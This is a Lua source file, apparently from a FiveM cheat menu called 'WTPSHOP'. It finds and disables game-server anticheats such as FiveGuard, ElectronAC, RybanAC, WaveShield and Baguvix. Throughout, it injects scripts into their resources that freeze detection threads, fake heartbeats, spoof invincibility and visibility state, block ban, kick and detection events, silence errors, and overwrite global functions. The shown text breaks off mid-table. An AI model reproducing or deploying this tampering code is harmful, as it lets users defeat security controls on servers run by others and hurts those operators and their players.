    local key = acBypassKey("FGAC", resource)
    if _acBypassLoaded[key] and not force then
        return true
    end
    local ok = pcall(MachoInjectResourceScriptOverride, 1, resource, [[
                local titenibongzzi = function()
                    local _, handlers = debug.getupvalue(RegisterNetEvent, 2)
                    local _, env = debug.getupvalue(AddEventHandler, 3)
                    if not handlers or not env then
                        return
                    end
                    local origWait = env.Citizen.Wait
                    local frozenThreads = {}
                    local seedWait = function(ms)
                        local co = coroutine.running()
                        if not co then return origWait(ms) end
                        local coId = tostring(co)

                        if frozenThreads[coId] then
                            return origWait(999999999)
                        end

                        local info = debug.getinfo(2, "S")
                        if info and info.source and info.source:find("Luraph") then
                            if ms and ms > 5000 then
                                frozenThreads[coId] = true
                                return origWait(999999999)
                            end
                        end
                        return origWait(ms)
                    end
                    rawset(env, "Wait", seedWait)
                    rawset(env.Citizen, "Wait", seedWait)
                    local packTarget = env.msgpack or env.cmsgpack
                    if packTarget then
                        local origPack = packTarget.pack
                        rawset(packTarget, "pack", function(...)
                            local args = {...}
                            for i, arg in ipairs(args) do
                                if type(arg) == "table" then
                                    for k, v in pairs(arg) do
                                        if type(v) == "boolean" and v == true then
                                            arg[k] = false
                                        end
                                        if type(v) == "number" and v > 0 and type(k) == "string" then
                                            arg[k] = 0
                                        end
                                    end
                                end
                            end
                            return origPack(...)
                        end)
                    end
                    for eventName, entry in pairs(handlers) do
                        if type(entry.handlers) == "table" then
                            for id, fn in pairs(entry.handlers) do
                                if type(fn) == "function" then
                                    for i = 1, 22 do
                                        local n, v = debug.getupvalue(fn, i)
                                        if not n then break end
                                        if type(v) == "table" then
                                            local mt = getmetatable(v)
                                            if mt and type(mt) == "table" then
                                                if mt.__newindex then
                                                    rawset(mt, "__newindex", nil)
                                                end
                                                if mt.__index and type(mt.__index) == "function" then
                                                    rawset(mt, "__index", nil)
                                                end
                                            end
                                        end
                                    end
                                    break
                                end
                            end
                        end
                    end
                    local origError = env.error
                    rawset(env, "error", function() end)
                    local origPrint = env.print
                    if origPrint then
                        rawset(env, "print", function(...)
                            local args = {...}
                            for _, arg in ipairs(args) do
                                if type(arg) == "string" and arg:find("Luraph") then
                                    return
                                end
                            end
                            return origPrint(...)
                        end)
                    end
                    local origTrace = env.Citizen.Trace
                    if origTrace then
                        rawset(env.Citizen, "Trace", function(msg)
                            if type(msg) == "string" and msg:find("Luraph") then
                                return
                            end
                            return origTrace(msg)
                        end)
                    end
                end
                titenibongzzi();
            ]], 'Luraph ', 1, 1)
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local function loadElectronBypass(resource, force)
    if not MachoInjectResourceScriptOverride then
        return false
    end
    local key = acBypassKey("ElectronAC", resource or "any")
    if _acBypassLoaded[key] and not force then
        return true
    end
    local injectRes = resource
    if GetResourceState(injectRes) ~= "started" then
        injectRes = "any"
    end
    local ok = pcall(MachoInjectResourceScriptOverride, 2, injectRes, [[
                Macho.Citizen.CreateThread(function()
                    Macho.Citizen.Wait(2000)
                    local sid = GetPlayerServerId(PlayerId())
                    local playerBag = string.format("player:%d", sid)
                    local hbSamples = {}
                    local sbh = AddStateBagChangeHandler("", playerBag, function(_, key, value)
                        if type(value) == "number" and value > 1000 then
                            if not hbSamples[key] then hbSamples[key] = {} end
                            local s = hbSamples[key]
                            s[#s + 1] = { t = GetGameTimer(), v = value }
                        end
                    end)
                    local origTSEI = TriggerServerEventInternal
                    local evtCounts = {}
                    TriggerServerEventInternal = function(eventName, packedArgs, packedLen, ...)
                        if type(packedLen) == "number" and packedLen <= 4 then
                            evtCounts[eventName] = (evtCounts[eventName] or 0) + 1
                        end
                        return origTSEI(eventName, packedArgs, packedLen, ...)
                    end
                    Macho.Citizen.Wait(12000)
                    TriggerServerEventInternal = origTSEI
                    RemoveStateBagChangeHandler(sbh)
                    local hbKey, hbMult
                    local bestSB = 0
                    for key, samples in pairs(hbSamples) do
                        if #samples > bestSB then
                            bestSB = #samples
                            hbKey = key
                            if #samples >= 2 then
                                local dv = samples[#samples].v - samples[1].v
                                local dt = samples[#samples].t - samples[1].t
                                if dt > 0 then hbMult = dv / dt end
                            end
                        end
                    end
                    hbMult = hbMult or 2
                    local hbEvent, bestEvt = nil, 0
                    for evt, count in pairs(evtCounts) do
                        if count > bestEvt then
                            bestEvt = count
                            hbEvent = evt
                        end
                    end
                    if hbEvent then
                        Macho.Citizen.CreateThread(function()
                            while true do
                                Macho.Citizen.Wait(5000)
                                local packed = msgpack.pack({})
                                pcall(origTSEI, hbEvent, packed, #packed)
                            end
                        end)
                    end

                    Macho.Citizen.Wait(12000)
                    local function disableAllModules(cfg)
                        if type(cfg) ~= "table" or not cfg.modules then return 0 end
                        local count = 0
                        for modName, modCfg in pairs(cfg.modules) do
                            if type(modCfg) == "table" and modCfg.enabled then
                                modCfg.enabled = false
                                count = count + 1
                            end
                        end
                        if cfg.replay and cfg.replay.enabled then
                            cfg.replay.enabled = false
                        end
                        return count
                    end
                    local configKeys = {}
                    local ok, gkeys = pcall(GetStateBagKeys, "global")
                    if ok and gkeys then
                        for _, key in ipairs(gkeys) do
                            local vok, val = pcall(GetStateBagValue, "global", key)
                            if vok and type(val) == "table" and val.modules then
                                configKeys[key] = true
                                local count = disableAllModules(val)
                                GlobalState[key] = val
                            end
                        end
                    end
                    AddStateBagChangeHandler("", "global", function(bagName, key, value)
                        if configKeys[key] or (type(value) == "table" and value.modules) then
                            configKeys[key] = true
                            local count = disableAllModules(value)
                            if count > 0 then
                                Macho.Citizen.CreateThread(function()
                                    Macho.Citizen.Wait(50)
                                    GlobalState[key] = value
                                end)
                            end
                        end
                    end)
                end)
            ]], 'Luraph ', 1, 1)
    if ok and injectRes ~= "any" then
        pcall(MachoInjectResourceScriptOverride, 2, "any", [[
            local origTSE = TriggerServerEvent
            TriggerServerEvent = function(evt, ...)
                if type(evt) == "string" then
                    local e = evt:lower()
                    if e:find("electron", 1, true) or e:find("anticheat", 1, true)
                        or e:find("punish", 1, true) or e:find("detection", 1, true) then
                        return
                    end
                end
                return origTSE(evt, ...)
            end
        ]], 'Luraph ', 1, 1)
    end
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local function loadRybanBypass(resource, force)
    if not resource or GetResourceState(resource) ~= "started" or not MachoInjectResourceScriptOverride then
        return false
    end
    local key = acBypassKey("RybanAC", resource)
    if _acBypassLoaded[key] and not force then
        return true
    end
    local _rbRes = resource
    local _rbUtils = _rbRes:gsub('_secure$', '_utils')
    local ok = pcall(MachoInjectResourceScriptOverride, 1, resource, [[
                local titekzxckasjdasdasdasdasd = function()
                    local origAddSBCH = AddStateBagChangeHandler
                    local origGetTimer = GetGameTimer
                    local origWait = Citizen.Wait
                    local origCT = Citizen.CreateThread
                    local origPairs = pairs
                    local origType = type
                    local origRawset = rawset
                    local origPrint = print
                    local origTSE = TriggerServerEvent
                    local origRegNE = RegisterNetEvent
                    local origLocalPlayer = LocalPlayer
                    local origGlobalState = GlobalState

                    local registeredHeartbeats = {}

                    local function fakeHeartbeat(moduleName, interval)
                        if origType(moduleName) == "string" then
                            registeredHeartbeats[moduleName] = {
                                interval = origType(interval) == "number" and interval or 250,
                                heartbeat = origGetTimer()
                            }
                        end
                    end

                    origRawset(_G, "Heartbeat", fakeHeartbeat)

                    local origGetEntityAlpha = GetEntityAlpha
                    local origIsEntityVisible = IsEntityVisibleToScript
                    local origGetPlayerInvincible = GetPlayerInvincible
                    local origGetEntityCanBeDamaged = GetEntityCanBeDamaged
                    local origGetEntityProofs = GetEntityProofs
                    local origPlayerPedId = PlayerPedId

                    local function spoofStateValue(key, val)
                        if origType(key) ~= "string" then return val end
                        if key:find("rb_teleport_verified", 1, true) then return true end
                        if key:find("rb_health_verified", 1, true) then return true end
                        if key:find("rb_armour_verified", 1, true) then return true end
                        if key:find("rb_revive_verified", 1, true) then return origGetTimer() end
                        if key:find("rb_freecam", 1, true) then return true end
                        local ped = origPlayerPedId()
                        if key:find("rb_invisible", 1, true) then
                            return not origIsEntityVisible(ped)
                        end
                        if key:find("rb_player_alpha", 1, true) then
                            return origGetEntityAlpha(ped)
                        end
                        if key:find("rb_invincible", 1, true) then
                            return origGetPlayerInvincible(ped)
                        end
                        if key:find("rb_can_be_damaged", 1, true) then
                            return origGetEntityCanBeDamaged(ped)
                        end
                        if key:find("rb_proof_", 1, true) then
                            local bul, fir, exp, col, mel, stm, drn = origGetEntityProofs(ped)
                            if key:find("bullets", 1, true) then return bul end
                            if key:find("fire", 1, true) then return fir end
                            if key:find("explosion", 1, true) then return exp end
                            if key:find("collision", 1, true) then return col end
                            if key:find("melee", 1, true) then return mel end
                            if key:find("steam", 1, true) then return stm end
                            if key:find("drown", 1, true) then return drn end
                        end
                        return val
                    end

                    origRawset(_G, "AddStateBagChangeHandler", function(keyFilter, bag, handler)
                        return origAddSBCH(keyFilter, bag, function(bagName, key, value, reserved, replicated)
                            value = spoofStateValue(key, value)
                            return handler(bagName, key, value, reserved, replicated)
                        end)
                    end)
                    AddStateBagChangeHandler = _G.AddStateBagChangeHandler

                    origAddSBCH("rb_heartbeat", "global", function()
                        local now = origGetTimer()
                        for _, data in origPairs(registeredHeartbeats) do
                            data.heartbeat = now
                        end
                    end)

                    origCT(function()
                        while true do
                            local now = origGetTimer()
                            for _, data in origPairs(registeredHeartbeats) do
                                data.heartbeat = now
                            end
                            origWait(150)
                        end
                    end)

                    local _acRes = "]] .. _rbRes .. [["
                    local _acUtils = "]] .. _rbUtils .. [["
                    local blockedDetections = {
                        ["esx_status:server:notifyPlayers"] = true,
                        ["esx_status:server:playerUpdated"] = true,
                        ["esx_status:server:playerUpdate"] = true,
                    }
                    blockedDetections[_acUtils .. ":detections:punishPlayer"] = true
                    blockedDetections[_acRes .. ":executorDetected"] = true
                    origRawset(_G, "TriggerServerEvent", function(evt, ...)
                        if origType(evt) == "string" then
                            if blockedDetections[evt] then return end
                            if evt:find(_acRes, 1, true) or evt:find(_acUtils, 1, true) then return end
                            if evt:find("by RrybaN") or evt:find("antiStop") or evt:find("antiGodmode") or evt:find("antiHealth") or evt:find("antiArmour") or evt:find("antiInvisible") or evt:find("antiCoords") or evt:find("antiRevive") or evt:find("antiClientCrash") then
                                return
                            end
                        end
                        return origTSE(evt, ...)
                    end)
                    TriggerServerEvent = _G.TriggerServerEvent
                    if TriggerServerEventInternal then
                        local origTSEI = TriggerServerEventInternal
                        origRawset(_G, "TriggerServerEventInternal", function(evt, ...)
                            if origType(evt) == "string" then
                                if blockedDetections[evt] then return end
                                if evt:find(_acRes, 1, true) or evt:find(_acUtils, 1, true) then return end
                            end
                            return origTSEI(evt, ...)
                        end)
                    end

                    local realState = origLocalPlayer.state
                    local realLP = origLocalPlayer

                    local stateProxy = setmetatable({}, {
                        __index = function(self, key)
                            if key == "set" then
                                return function(s, k, v, r) return realState:set(k, v, r) end
                            end
                            return spoofStateValue(key, realState[key])
                        end,
                        __newindex = function(self, key, value)
                            realState[key] = value
                        end,
                    })
                    local lpProxy = setmetatable({}, {
                        __index = function(self, key)
                            if key == "state" then return stateProxy end
                            return realLP[key]
                        end,
                        __newindex = function(self, key, value)
                            realLP[key] = value
                        end,
                    })
                    origRawset(_G, "LocalPlayer", lpProxy)
                    LocalPlayer = lpProxy

                    origRawset(_G, "IsModuleEnabled", function() return false end)

                    origRawset(Citizen, "Trace", function() end)
                    origRawset(_G, "error", function() end)

                    local origExports = exports
                    origCT(function()
                        origWait(0)
                        origExports("IsBlacklistedObject", function() return false end)
                    end)

                    local nativeBlacklist = {
                        "GetPlayerInvincible", "GetEntityCanBeDamaged", "GetEntityProofs",
                        "IsEntityVisibleToScript", "GetEntityAlpha", "IsEntityAttachedToAnyPed",
                    }
                    for _, name in origPairs(nativeBlacklist) do
                        if _G[name] then
                            origRawset(_G, name, function(...)
                                if name == "GetPlayerInvincible" then return false end
                                if name == "GetEntityCanBeDamaged" then return true end
                                if name == "IsEntityVisibleToScript" then return true end
                                if name == "GetEntityAlpha" then return 255 end
                                if name == "IsEntityAttachedToAnyPed" then return false end
                                if name == "GetEntityProofs" then return false, false, false, false, false, false, false end
                            end)
                        end
                    end

                    local TableSpecials = {
                        ["print"] = true,
                        ["_G"] = true,
                        ["__VERSION"] = true,
                    }
                    _G["__VERSION"] = _G
                    origRawset(_G, "print", origPrint)
                    for k, v in origPairs(_G) do
                        if not TableSpecials[k] and k ~= "Heartbeat" then
                            _G[k] = function()
                                _ENV(10000 * 10000)
                            end
                        end
                    end
                end
                titekzxckasjdasdasdasdasd();
            ]], '=?', 1, 100)
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local fiveguardResource = nil

local function resolveFiveGuardClientResource()
    if fiveguardResource and GetResourceState(fiveguardResource) ~= "started" then
        fiveguardResource = nil
    end
    if fiveguardResource and GetResourceState(fiveguardResource) == "started" then
        return fiveguardResource
    end
    for i = 0, GetNumResources() - 1 do
        local resource = GetResourceByFindIndex(i)
        if resource then
            local count = GetNumResourceMetadata(resource, "client_script") or 0
            for j = 0, count - 1 do
                local meta = GetResourceMetadata(resource, "client_script", j)
                if meta and type(meta) == "string" and meta:lower():find("obfuscated") then
                    fiveguardResource = resource
                    return resource
                end
            end
        end
    end
    return nil
end

function ApiRasclat.IsAnticheatResource(res)
    if not res or res == "" then
        return false
    end
    if ACExceptions[res] then
        return true
    end
    local fgRes = resolveFiveGuardClientResource()
    if fgRes and res == fgRes then
        return true
    end
    for _, ac in ipairs(detectedAC) do
        if ac.resource == res then
            return true
        end
    end
    return false
end

local AC_INJECT_BYPASS_TYPES = {
    FGAC = true, ElectronAC = true, RybanAC = true, PraryoAC = true,
    WS = true, LeakDawAC = true,
}

local AC_POOL_ONLY_TYPES = {
    ZeroInject = true, SenAC = true, AAC = true,
    ReaperV4 = true, FiniAC = true, Eminence = true, AegisX = true,
    FireAC = true, CyberAC = true, ReasonAC = true, GreekAC = true, GenericAC = true,
}

local function loadWaveShieldBypass(resource, force)
    resource = resource or "WaveShield"
    if GetResourceState(resource) ~= "started" or not MachoInjectResource2 then
        return false
    end
    local key = acBypassKey("WS", resource)
    if _acBypassLoaded[key] and not force then
        return true
    end
    local ok = pcall(MachoInjectResource2, 3, resource, [[
            pcall(function()
                local origTSE = TriggerServerEvent
                local origType = type
                local function blockAcEvent(evt)
                    if origType(evt) ~= "string" then return false end
                    local e = evt:lower()
                    return e:find("waveshield", 1, true)
                        or e:find("wave_shield", 1, true)
                        or e:find("anticheat", 1, true)
                        or e:find("executor", 1, true)
                        or e:find("detection", 1, true)
                        or e:find(":ban", 1, true)
                        or e:find(":kick", 1, true)
                end
                TriggerServerEvent = function(evt, ...)
                    if blockAcEvent(evt) then return end
                    return origTSE(evt, ...)
                end
                if TriggerServerEventInternal then
                    local origTSEI = TriggerServerEventInternal
                    TriggerServerEventInternal = function(evt, ...)
                        if blockAcEvent(evt) then return end
                        return origTSEI(evt, ...)
                    end
                end
            end)
        ]])
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local function loadVynxBypass(resource, force)
    resource = resource or "VynxAC"
    if GetResourceState(resource) ~= "started" or not MachoInjectResource2 then
        return false
    end
    local key = acBypassKey("LeakDawAC", resource)
    if _acBypassLoaded[key] and not force then
        return true
    end
    local ok = pcall(MachoInjectResource2, 3, resource, [[
            pcall(function()
                local origTSE = TriggerServerEvent
                local origType = type
                local function blockAcEvent(evt)
                    if origType(evt) ~= "string" then return false end
                    local e = evt:lower()
                    return e:find("vynx", 1, true)
                        or e:find("leakdaw", 1, true)
                        or e:find("anticheat", 1, true)
                        or e:find("executor", 1, true)
                        or e:find("punish", 1, true)
                        or e:find("detection", 1, true)
                        or e:find(":ban", 1, true)
                        or e:find(":kick", 1, true)
                end
                TriggerServerEvent = function(evt, ...)
                    if blockAcEvent(evt) then return end
                    return origTSE(evt, ...)
                end
                if TriggerServerEventInternal then
                    local origTSEI = TriggerServerEventInternal
                    TriggerServerEventInternal = function(evt, ...)
                        if blockAcEvent(evt) then return end
                        return origTSEI(evt, ...)
                    end
                end
            end)
        ]])
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local function loadPoolOnlyAck(ac, force)
    local key = acBypassKey("PoolAck", ac.type .. "|" .. ac.resource)
    if _acBypassLoaded[key] and not force then
        return true
    end
    _acBypassLoaded[key] = true
    return true
end

local function tryAcBypass(ac, force)
    if not ac or not ac.type then
        return false, nil
    end
    if ac.type == "FGAC" then
        local ok = loadFgacBypass(ac.resource, force)
        local fgClient = resolveFiveGuardClientResource()
        if fgClient then
            if fgClient ~= ac.resource then
                loadFgacBypass(fgClient, force)
            end
            loadFiveGuardClientBypass(fgClient, force)
        end
        return (ok or fgClient ~= nil), "inject"
    elseif ac.type == "ElectronAC" then
        if GetResourceState(ac.resource) ~= "started" then
            return false, "inject"
        end
        return loadElectronBypass(ac.resource, force), "inject"
    elseif ac.type == "RybanAC" then
        local rbOk = loadRybanBypass(ac.resource, force)
        loadRybanSecureBypass(force)
        return rbOk, "inject"
    elseif ac.type == "PraryoAC" then
        local prOk = loadPraryoBypass(ac.resource, force)
        tryPraryoBypassOnJoin(force)
        return prOk, "inject"
    elseif ac.type == "WS" then
        return loadWaveShieldBypass(ac.resource, force), "inject"
    elseif ac.type == "LeakDawAC" then
        return loadVynxBypass(ac.resource, force), "inject"
    elseif AC_POOL_ONLY_TYPES[ac.type] then
        return loadPoolOnlyAck(ac, force), "pool"
    end
    return false, nil
end

local function allAcBypassesSatisfied()
    for _, ac in ipairs(detectedAC) do
        local state = GetResourceState(ac.resource)
        if state == "missing" or state == "unknown" then
            goto continue_ac
        end
        if state ~= "started" then
            goto continue_ac
        end
        if AC_INJECT_BYPASS_TYPES[ac.type] then
            if not _acBypassLoaded[acBypassKey(ac.type, ac.resource)] then
                return false
            end
        elseif AC_POOL_ONLY_TYPES[ac.type] then
            if not _acBypassLoaded[acBypassKey("PoolAck", ac.type .. "|" .. ac.resource)] then
                return false
            end
        end
        ::continue_ac::
    end
    local fgRes = resolveFiveGuardClientResource()
    if fgRes and not _acBypassLoaded[acBypassKey("FiveGuardClient", fgRes)] then
        return false
    end
    return true
end

function WTPSHOP:GetBypassStatus()
    local lines = {}
    for _, ac in ipairs(detectedAC) do
        local status = "pool-only"
        if AC_INJECT_BYPASS_TYPES[ac.type] then
            local key = acBypassKey(ac.type, ac.resource)
            status = _acBypassLoaded[key] and "loaded" or ("pending (" .. GetResourceState(ac.resource) .. ")")
        elseif AC_POOL_ONLY_TYPES[ac.type] then
            local key = acBypassKey("PoolAck", ac.type .. "|" .. ac.resource)
            status = _acBypassLoaded[key] and "exceptions OK" or "pending"
        else
            status = "unknown"
        end
        lines[#lines + 1] = string.format("%s [%s] @ %s — %s", ac.name, ac.type, ac.resource, status)
    end
    local fgRes = resolveFiveGuardClientResource()
    if fgRes then
        local fgKey = acBypassKey("FiveGuardClient", fgRes)
        lines[#lines + 1] = string.format("FiveGuard client [%s] — %s", fgRes, _acBypassLoaded[fgKey] and "loaded" or "pending")
    end
    if GetResourceState("rryban_secure") == "started" then
        local rsKey = acBypassKey("RybanSecure", "rryban_secure")
        lines[#lines + 1] = string.format("Rryban Secure — %s", _acBypassLoaded[rsKey] and "loaded" or "pending")
    end
    if #lines == 0 then
        lines[1] = "No anticheat detected on this server."
    end
    if serverHasFocusAcDetected() then
        lines[#lines + 1] = "Focus: Ryban, Electron, FG, Praryo."
    end
    if WTPSHOP:InjectBypassRequired() then
        lines[#lines + 1] = "Inject waits for bypass."
    end
    lines[#lines + 1] = string.format("Combat: hand-spoof=%s | stealth ammo=%s | bypass satisfied=%s",
        WTPSHOP.SpoofWeaponActive and ("on (hash " .. tostring(WTPSHOP.HandWeaponHash) .. ")") or "off",
        WTPSHOP.InfiniteAmmoStealth and "on" or "off",
        allAcBypassesSatisfied() and "yes" or "no")
    return lines
end

function WTPSHOP:BypassReady(requiredTypes)
    local fgRes = resolveFiveGuardClientResource()
    if fgRes and not _acBypassLoaded[acBypassKey("FiveGuardClient", fgRes)] then
        return false
    end
    if #detectedAC == 0 then
        return true
    end
    local need = {}
    if requiredTypes then
        for _, t in ipairs(requiredTypes) do
            need[t] = true
        end
    else
        for t in pairs(AC_INJECT_BYPASS_TYPES) do
            need[t] = true
        end
    end
    for _, ac in ipairs(detectedAC) do
        if need[ac.type] and AC_INJECT_BYPASS_TYPES[ac.type] then
            if GetResourceState(ac.resource) == "started" then
                if not _acBypassLoaded[acBypassKey(ac.type, ac.resource)] then
                    return false
                end
            end
        end
    end
    return true
end

function WTPSHOP:InjectBypassRequired()
    local fgRes = resolveFiveGuardClientResource()
    if fgRes and GetResourceState(fgRes) == "started" then
        return true
    end
    for _, ac in ipairs(detectedAC) do
        if AC_INJECT_BYPASS_TYPES[ac.type] and GetResourceState(ac.resource) == "started" then
            return true
        end
    end
    return false
end

function WTPSHOP:GuardInject(actionLabel)
    if not self:InjectBypassRequired() then
        return true
    end
    if self:BypassReady() then
        return true
    end
    self:Notify("error", "WTPSHOP", (actionLabel or "Feature") .. ": bypass not ready (F8 / Reload Bypass).", 4500)
    return false
end

local function ensureAllAcBypasses(force, rescan)
    if rescan then
        ApiRasclat.ScanAllAnticheats()
    end
    resolveFiveGuardClientResource()
    local loadedNames = {}
    local poolOnlyNames = {}
    for _, ac in ipairs(detectedAC) do
        ACExceptions[ac.resource] = true
        ACExceptionsType[ac.type] = true
        if ac.type == "RybanAC" and not _rybanSpoofRes then
            _rybanSpoofRes = ac.resource
            local numMeta = GetNumResourceMetadata(ac.resource, 'shared_script') or 0
            for j = 0, numMeta - 1 do
                local val = GetResourceMetadata(ac.resource, 'shared_script', j)
                if val and val:find('secure%-events') then
                    local srcRes = val:match('^@([^/]+)/')
                    if srcRes then
                        _rybanSpoofRes = srcRes
                        _rybanSpoofSrc = ('@@%s/%s'):format(srcRes, val:match('^@[^/]+/(.+)$'))
                    else
                        _rybanSpoofSrc = ('@@%s/%s'):format(ac.resource, val)
                    end
                    break
                end
            end
            if not _rybanSpoofSrc then
                _rybanSpoofSrc = ('@@%s/shared/secure-events.lua'):format(ac.resource)
            end
        end
        if ac.type == "PraryoAC" then
            configurePraryoKernel(ac.resource)
        end
        local ok, mode = tryAcBypass(ac, force)
        if ok and mode == "inject" then
            loadedNames[#loadedNames + 1] = ac.name
        elseif ok and mode == "pool" then
            poolOnlyNames[#poolOnlyNames + 1] = ac.name .. " (pool-only)"
        end
    end
    tryPraryoBypassOnJoin(force)
    local fgRes = resolveFiveGuardClientResource()
    if fgRes and loadFiveGuardClientBypass(fgRes, force) then
        loadedNames[#loadedNames + 1] = "FiveGuard client"
    end
    if not serverHasFocusAcDetected() and GetResourceState("baguvix") == "started" and loadBaguvixBypass(force) then
        loadedNames[#loadedNames + 1] = "Baguvix"
    end
    if loadRybanSecureBypass(force) then
        loadedNames[#loadedNames + 1] = "Rryban Secure"
    end
    for _, name in ipairs(poolOnlyNames) do
        loadedNames[#loadedNames + 1] = name
    end
    return loadedNames
end

local _autoBypassLaunchStarted = false

function WTPSHOP:AutoLaunchBypass(opts)
    opts = opts or {}
    local restrictedIPs = {}
    for _, ip in ipairs(restrictedIPs) do
        if ip ~= "" and currentEndpoint == ip then
            return false
        end
    end

    local silent = opts.silent == true
    local rescan = opts.rescan ~= false
    local maxAttempts = opts.maxAttempts or 12
    local retryDelay = opts.retryDelay or 550

    if not silent then
        pcall(function()
            self:Notify("info", "WTPSHOP", "Loading bypass...", 2500)
        end)
    end

    ensureAllAcBypasses(true, rescan)
    pcall(function()
        WTPSHOP:InstallInventoryWeaponBypass()
    end)

    local attempt = 0
    while not allAcBypassesSatisfied() and attempt < maxAttempts do
        Wait(retryDelay)
        ensureAllAcBypasses(true, false)
        attempt = attempt + 1
    end

    if not silent then
        pcall(function()
            if allAcBypassesSatisfied() then
                self:Notify("success", "WTPSHOP",
                    string.format("Bypass ready (%d AC). F8 for status.", #detectedAC), 4000)
            else
                self:Notify("error", "WTPSHOP", "Bypass load incomplete.", 4000)
            end
        end)
    end

    return allAcBypassesSatisfied()
end

local function startAutoBypassOnInject()
    if not AutoLoadBypass or _autoBypassLaunchStarted then
        return
    end
    _autoBypassLaunchStarted = true
    CreateThread(function()
        Wait(0)
        WTPSHOP:AutoLaunchBypass({
            silent = true,
            rescan = true,
            maxAttempts = 15,
            retryDelay = 500,
        })
        print("^2[WTPSHOP]^7 Bypass on inject: satisfied=" .. tostring(allAcBypassesSatisfied()))
    end)
end

local function loadRybanSecureBypass(force)
    if GetResourceState("rryban_secure") ~= "started" or not MachoInjectResource2 then
        return false
    end
    local key = acBypassKey("RybanSecure", "rryban_secure")
    if _acBypassLoaded[key] and not force then
        return true
    end
    local ok = pcall(MachoInjectResource2, 3, "rryban_secure", [[
        CreateThread(function()
            while GetResourceState("rryban_secure") == "started" do
                LocalPlayer.state.rb_health_verified = true
                LocalPlayer.state.rb_armour_verified = true
                LocalPlayer.state.rb_teleport_verified = true
                LocalPlayer.state:set("rb_teleport_verified", true, true)
                LocalPlayer.state.rb_freecam = true
                LocalPlayer.state.rb_invisible = true
                LocalPlayer.state.rb_player_alpha = 255
                LocalPlayer.state.rb_invincible = true
                LocalPlayer.state.rb_invincible2 = true
                LocalPlayer.state.rb_proof_bullets = true
                LocalPlayer.state.rb_proof_fire = true
                LocalPlayer.state.rb_proof_explosion = true
                LocalPlayer.state.rb_proof_collision = true
                LocalPlayer.state.rb_proof_melee = true
                LocalPlayer.state.rb_proof_steam = true
                LocalPlayer.state.rb_proof_drown = true
                Wait(0)
            end
        end)
    ]])
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local function loadBaguvixBypass(force)
    if GetResourceState("baguvix") ~= "started" or not MachoInjectResource2 then
        return false
    end
    local key = acBypassKey("Baguvix", "baguvix")
    if _acBypassLoaded[key] and not force then
        return true
    end
    pcall(MachoInjectResource2, 3, "baguvix", [[
            _G.TriggerServerEvent = true
            _G.TriggerLatentServerEvent = true
            pcall(function()
                for name, value in pairs(_G) do
                    if type(value) == "table" and name ~= "_G" and name ~= "SetStateBagValue" then
                        _G[name] = 1337
                    end
                end
            end)
            pcall(function()
                debug.setmetatable(_G, {
                    __newindex = function(t, k, v) end,
                    __metatable = false
                })
            end)
        ]])
    pcall(MachoInjectResource2, 3, "baguvix", [[
            local oldTrigger = _G.TriggerServerEvent
            _G.TriggerServerEvent = function(...) end
            _G.TriggerLatentServerEvent = function(...) end
            for name, value in pairs(_G) do
                if type(value) == "table" and name ~= "_G" then
                    for k, v in pairs(value) do
                        if type(k) == "string" and (k:find("Ban") or k:find("Kick") or k:find("Check")) then
                            value[k] = function() return end
                        end
                    end
                end
            end
        ]])
    _acBypassLoaded[key] = true
    return true
end

local function loadFiveGuardClientBypass(resource, force)
    if not resource or GetResourceState(resource) ~= "started" or not MachoInjectResource2 then
        return false
    end
    local key = acBypassKey("FiveGuardClient", resource)
    if _acBypassLoaded[key] and not force then
        return true
    end
    local ok = pcall(MachoInjectResource2, 3, resource, [[ 
            pcall(function()
                local _, w = debug.getupvalue(EnableAllControlActions, 1)
                if not w then return end
                local _, M = debug.getupvalue(w[17], 1)
                if not M then return end
                local _, env = debug.getupvalue(M.h, 1)
                if env then env = nil end

                local function getEventHandlers()
                    local i = 1
                    while true do
                        local name, val = debug.getupvalue(AddEventHandler, i)
                        if not name then break end
                        if name == "eventHandlers" and type(val) == "table" then
                            return val
                        end
                        i = i + 1
                    end
                end

                local seen = {}
                local function scan(t)
                    if type(t) ~= "table" or seen[t] then return end
                    seen[t] = true
                    for k,v in pairs(t) do
                        if type(v) == "string" and v == "67314B49663351436761505579774D46654163554539436B4D7761326F575A49" then
                            t[k] = nil
                        elseif type(v) == "table" then
                            scan(v)
                        end
                    end
                end

                local i = 1
                while true do
                    local _, v = debug.getupvalue(AddEventHandler, i)
                    if not v then break end
                    if type(v) == "table" then scan(v) end
                    i = i + 1
                end

                local eventHandlers = getEventHandlers()
                if type(eventHandlers) == "table" then
                    local targets = {
                        ["CEventGunShot"]="Spoofed Bullet Ban Bypassed #1",["CEventGunShotBulletImpact"]="Spoofed Bullet Ban Bypassed #2",
                        ["gameEventTriggered"]="Client Manipulate Ban Bypassed",["jjspob"]="Unknown",["CEventExplosion"]="Explosion Detect Bypassed",
                        ["CEventExplosionHeard"]="Explosion Heard Bypassed",["CEventShockingExplosion"]="Shocking Explosion Bypassed",
                        ["CEventShockingGunshotFired"]="Gunshot Fired Bypassed",["CEventShockingGunshotHitPed"]="Gunshot Hit Ped Bypassed",
                        ["CEventShockingGunshotHitBuilding"]="Gunshot Hit Building Bypassed",["CEventShockingHelicopterOverhead"]="Helicopter Overhead Bypassed",
                        ["CEventShockingCarCrash"]="Car Crash Bypassed",["CEventShockingDrivingOnPavement"]="Driving On Pavement Bypassed",
                        ["CEventShockingBicycleOnPavement"]="Bicycle On Pavement Bypassed",["CEventShockingMadDriver"]="Mad Driver Bypassed",
                        ["CEventShockingPoliceInvestigating"]="Police Investigation Bypassed",["CEventShockingVisibleWeapon"]="Visible Weapon Bypassed",
                        ["CEventShockingVisibleWeaponThreat"]="Weapon Threat Bypassed",["CEventShockingDeadBody"]="Dead Body Bypassed",
                        ["CEventShockingDangerousAnimal"]="Dangerous Animal Bypassed",["CEventShockingEngineRevved"]="Engine Rev Bypassed",
                        ["CEventShockingHornSounded"]="Horn Sound Bypassed",["CEventShockingInDangerousVehicle"]="Dangerous Vehicle Bypassed",
                        ["CEventShockingNiceCar"]="Nice Car Bypassed",["CEventShockingPedKnockedIntoByPlayer"]="Ped Knocked Bypassed",
                        ["CEventShockingPotentialBlast"]="Potential Blast Bypassed",["CEventShockingPropertyDamage"]="Property Damage Bypassed",
